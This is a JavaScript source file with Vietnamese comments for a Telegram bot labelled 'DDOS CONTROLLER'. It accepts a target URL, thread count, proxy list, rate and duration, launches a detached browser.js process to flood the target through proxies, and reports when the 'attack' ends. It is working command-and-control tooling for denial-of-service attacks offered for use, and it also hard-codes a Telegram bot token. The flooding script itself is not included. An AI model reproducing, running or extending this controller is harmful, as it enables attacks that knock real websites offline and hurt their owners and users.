// bot.js - TELEGRAM CONTROLLER - KHÔNG GỬI LOG - CHỈ CHẠY browser.js
const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const fs = require('fs');

// === CẤU HÌNH ===
const TOKEN = '7580314584:AAFLRinlnilclZpQgXt4fc5uKu2YSUwxH4k'; // ĐỔI TOKEN MỚI!
const DEFAULT_PROXY = 'proxy1.txt';
const bot = new Telegraf(TOKEN);

let isRunning = false;

// === /start ===
bot.start((ctx) => {
    ctx.replyWithMarkdown(`
*DDOS CONTROLLER*

\`/d <url> <luồng> [proxy.txt] [rate] <giây>\`

*Ví dụ:*
\`/d https://example.com 10 50 60\`

\`/stop\` → Dừng
Proxy mặc định: \`${DEFAULT_PROXY}\``
    );
});

// === /d → GỌI browser.js (KHÔNG GỬI LOG) ===
bot.command('d', (ctx) => {
    if (isRunning) return ctx.reply('Đang chạy! Dùng /stop trước.');

    const args = ctx.message.text.trim().split(/\s+/).slice(1);
    if (args.length < 3) return ctx.replyWithMarkdown('Sai! Ví dụ: `/d url 10 50 60`');

    let url = args[0];
    let time = args[args.length - 1];
    let threads = null;
    let rate = '100';
    let proxyFile = DEFAULT_PROXY;

    // Tìm threads (số đầu tiên sau URL)
    for (let i = 1; i < args.length - 1; i++) {
        if (!isNaN(args[i]) && args[i] > 0 && !threads) {
            threads = args[i];
        } else if (args[i].endsWith('.txt') && fs.existsSync(args[i])) {
            proxyFile = args[i];
        } else if (!isNaN(args[i])) {
            rate = args[i];
        }
    }

    if (!threads) return ctx.reply('Thiếu số luồng!');
    if (!url.match(/^https?:\/\//i)) return ctx.reply('URL phải có http:// hoặc https://');
    if (threads < 1 || threads > 50) return ctx.reply('Luồng: 1-50');
    if (time < 10) return ctx.reply('Thời gian ≥ 10 giây');
    if (rate < 1 || rate > 1000) return ctx.reply('Rate: 1-1000');
    if (!fs.existsSync(proxyFile)) return ctx.reply(`Không thấy file: ${proxyFile}`);

    // === BÁO KHỞI CHẠY ===
    ctx.replyWithMarkdown(`
*Khởi chạy...*
URL: \`${url}\`
Luồng: \`${threads}\`
Proxy: \`${proxyFile}\`
Rate: \`${rate}\`
Thời gian: \`${time}s\`
    `);

    // === CHẠY browser.js - KHÔNG GỬI LOG ===
    const child = spawn('node', ['browser.js', url, threads, proxyFile, rate, time], {
        detached: true,
        stdio: 'ignore' // ← KHÔNG GỬI LOG VỀ TELEGRAM
    });

    child.unref();
    isRunning = true;

    console.log(`[BOT] Chạy: node browser.js ${url} ${threads} ${proxyFile} ${rate} ${time}`);

    // === TỰ ĐỘNG BÁO KẾT THÚC ===
    setTimeout(() => {
        if (isRunning) {
            ctx.reply('*Tấn công đã kết thúc theo thời gian.*');
            isRunning = false;
        }
    }, (parseInt(time) + 10) * 1000);
});

// === /stop ===
bot.command('stop', (ctx) => {
    if (!isRunning) return ctx.reply('Không có tiến trình nào đang chạy.');

    require('child_process').exec('pkill -f "node browser.js" || taskkill /f /im node.exe 2>nul');
    require('child_process').exec('pkill -f chrome || taskkill /f /im msedge.exe 2>nul');
    require('child_process').exec('pkill -f floodbrs.js || taskkill /f /im node.exe 2>nul');

    isRunning = false;
    ctx.reply('*ĐÃ DỪNG HOÀN TOÀN TẤT CẢ TIẾN TRÌNH!*');
    console.log('[BOT] ĐÃ DỪNG TẤT CẢ');
});

// === KHỞI ĐỘNG ===
bot.launch().then(() => console.log('Bot đang chạy... Gửi /start'));
process.once('SIGINT', () => bot.stop('SIGINT'));
